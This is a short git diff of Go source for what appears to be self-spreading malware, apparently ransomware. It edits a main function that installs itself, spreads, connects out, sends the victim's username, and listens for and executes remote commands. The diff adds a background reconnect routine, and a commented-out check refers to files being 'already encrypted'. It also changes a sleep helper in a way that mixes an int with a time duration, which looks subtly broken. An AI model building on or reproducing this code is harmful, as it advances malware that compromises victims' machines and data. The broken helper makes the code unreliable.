@@ -23,8 +23,9 @@ func main() {
 	Install()
 	Spread()
 	c, _ = Connect()
-	go Send("user", GetUsername())
+	Send("user", GetUsername())
 	go ListenAndExecute()
+	go Reconnect()
 
 	/*if ReadRegDone() {
 		//Already encrypted
@@ -84,6 +85,6 @@ func ParseProtocol(r string) {
 }
 
 // Wait waits 30 seconds
-func Wait() {
-	time.Sleep(30 * time.Second)
+func Wait(s int) {
+	time.Sleep(s * time.Second)
 }
